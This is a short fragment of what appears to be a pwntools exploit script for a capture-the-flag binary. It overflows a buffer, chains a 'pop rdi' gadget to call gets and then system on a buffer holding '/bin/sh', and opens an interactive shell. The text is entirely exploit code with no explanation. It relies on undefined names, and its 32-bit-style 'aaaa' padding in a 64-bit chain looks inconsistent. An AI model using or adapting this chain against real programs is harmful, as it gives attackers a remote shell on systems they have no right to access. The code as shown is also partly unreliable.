pop_rdi = 0x4007f3 # 0x00000000004007f3 : pop rdi ; ret
payload = cyclic(0xA + 8) + p64(pop_rdi) + p64(buf2) + p64(gets) +
p64(pop_rdi) + p64(buf2) + p64(system) + 'aaaa' + p64(buf2)
io.sendline(payload)
io.sendline("/bin/sh")
io.recv()
io.interactive()
